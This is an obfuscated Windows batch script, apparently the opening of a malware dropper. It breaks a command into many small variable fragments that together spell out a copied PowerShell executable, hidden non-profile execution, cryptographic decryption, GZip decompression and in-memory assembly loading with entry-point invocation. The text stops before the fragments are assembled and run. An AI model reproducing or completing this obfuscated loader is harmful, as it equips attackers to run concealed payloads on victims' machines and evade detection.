@echo off
set "QqoSoONnvj=nd"
set "WlZfIUGTFt=1."
set "QQwufTVMlR=rS"
set "DUtMQpYLqq= /"
set "uGunplFOzh=em"
set "rTmKKwZViL= C"
set "FzrCFfUKxz=po"
set "MJlEMkAxGV=ws"
set "HrYYLSowuI=ll"
set "aWwfKXqBuZ=ll"
set "EUGtDzTLFA=ow"
set "JwdkXwsTqQ=we"
set "SIEnewTxAD=he"
set "bTvOkdYHld=we"
set "ujfWHtLbhS=\W"
set "tqkyLEDVFN=do"
set "eYhNVZfKFJ=Sy"
set "muRaoSgUhG=rs"
set "YZCQHaRQfA=xe"
set "YniYfFNTyE=32"
set "TvFdhfUGxM=py"
set "BEAiAUAMmT=y "
set "ukdMGnsaOv=Wi"
set "ADHGDRXlWG=Po"
set "fFLAsgQzew=s\"
set "SMUKszDJjg=st"
set "YgnCjQJEUT=he"
set "gYhRakIroM=.e"
set "quCUxGZpUX=:\"
set "HaXfGDPOfT=co"
set "DgqXcyETxJ=in"
set "mTmCfJgnAK=\v"
set "uuMrvyRyIn=0\"
set "JvNjlSIcxu= %~dp0"
set "WjhuzYmmPT=cd"
set "dYIseCHDYs=bSku"
set "ioqIBCQYlE=ert]"
set "vKaIrTCQQP=.GZi"
set "qnTFRigosC=oryS"
set "ZlqQOvtyKS=$udR"
set "xHKVhXejJi=stem"
set "ABeYoXeCwj=-nop"
set "orUzbCZOVE=pose"
set "lRMIlQoXYY=[-1."
set "FfUixVNNQj= = N"
set "EnIiXdKVxX=..-1"
set "sDrpEIQjvh=em.I"
set "RLWMqgnUyY=fjN."
set "fmNNKpMtgF=Syst"
set "HYbQNBbdEe=esMa"
set "jcQMUzgLkZ=stem"
set "cgFICyCLot=b) {"
set "zFzwZFSlER=A.En"
set "bvGFdeIyNc=bstr"
set "CQYYLBVZXC=BB ="
set "JRpuiMzVqa=:: '"
set "tdnOqOkeFB=();$"
set "vpNqliOWdI=raph"
set "coseiHXbSs=fjN "
set "vEPKclAcmx=e]::"
set "pnhwHeSQay=am;$"
set "KcIwZLKmFV=bphY"
set "oozgTwbRkT=nghz"
set "KCDleThqXI=grap"
set "vvmeGskvgv=tS46"
set "DTrYjuwBBB=flec"
set "vQNPfFNLEo=[]] "
set "vNuxCALRjn=JXeV"
set "fYydXGQleg=JShz"
set "PaBAEJIiwp=ay()"
set "vzTqDiDkZw=y.Cr"
set "CAdvWrRwXC=BC;$"
set "SzsXaLBMyD=bSku"
set "AGpHiUWovK=eam("
set "otaEauioeK=Ix.T"
set "ZZbVezKYcz=y.Pa"
set "ZMagqqjLEy=bSku"
set "iNBBJDZKho=();$"
set "QKNIfcuNUj=$bph"
set "ifwsYIpmnP=le  "
set "KZTllvQIzJ=;$ud"
set "BrpVbSWozU=Obje"
set "cDHgJthmsf=bSku"
set "xEASZbhSnM=and "
set "RmDSddnQxe=$GWu"
set "cINpSSWHlJ=nage"
set "gPVklrWusd=ress"
set "tAkayKQfmZ=F'[-"
set "XyTcFnYfhk=ddin"
set "SgUuJWvyQK= [Sy"
set "bmmqrLcFnZ=d;$p"
set "EduVauZLGe=onve"
set "MiIBKxVais=brea"
set "QAFzECNKbB=ck($"
set "WBvlcvGZuB=lit("
set "SzDByTBjlP=yste"
set "DnheZxQGfI='[-1"
set "HNzUJHpGcN=Secu"
set "gvhtvSGmOE=rtS4"
set "oYZhoKDNBy=$JSh"
set "ffSENyhWcx=oArr"
set "YOleCBFebK=n ''"
set "HAdIXdVfeI=tem."
set "sEVEucfUSf=]::N"
set "TdeRamYsay=HxCg"
set "zHnbHyxFfL=ecry"
set "QPYYTVKojy=$kYi"
set "hRgdsHvyqi=yTo("
set "nXTTrlYElw=XMFF"
set "qOcHsalAYj=sion"
set "QpOQetiOwD=($ZD"
set "kkThjCFBRY=zHhH"
set "twIiicbcIr=, (,"
set "TmadiMFqpu=m(, "
set "YVYqWvJVHn=;$JX"
set "IqHAspbbpo=bphY"
set "pfWQkGKcaC=]::("
set "BiPtJjfvbs=tion"
set "bJZXMaiyxV= = ["
set "kFJRXRbZGM=1] -"
set "prPAcMBekQ=);$p"
set "PrOUvMiYha=ct S"
set "hwutrABrEg=pose"
set "WvBqEamLpA=YX);"
set "XvvqmgtMwb=7;$p"
set "vSFozcvMpJ=gMod"
set "GUDYlEVPLE=g = "
set "AizxoSnlrw=join"
set "gwnaDSlsAN=ddin"
set "eJzhMyPMQh=PxEW"
set "UcSMWTyXly=tsWi"
set "cRFgXYLEEc=6] -"
set "potLrdKUSQ=m.IO"
set "JyespFfLIy=Invo"
set "OzPuezauUP=ring"
set "kuWTVvCxSq=bjec"
set "HnEMBLMwJf=th('"
set "HtkaCzGnFw=yste"
set "mgEtsZTVuw=Bmor"
set "alDFWqSowC=ispo"
set "BJrYpfzOaq=Comp"
set "vKaXaljanc=.Sec"
set "ReMTGwQzPL=.Mod"
set "huKIivXPXM='[-1"
set "MFagQGxUeH=y]::"
set "tXnnuGzEft=.Cre"
set "IlGmrAiPzT=ress"
set "YCDbkcljEA=dj0C"
set "QzDbfbkCDF=CFxo"
set "RbzVcEmtcC=hzf."
set "fijekApzsN=ku.I"
set "kQZSGPKcYd=BB);"
set "NdqgFPxhyn=eMVs"
set "GGKYZopiHd=.IO."
set "SCGmxtiqcl=ZDfj"
set "RNGkujUXlt=Syst"
set "tDHkmpRyfM= = $"
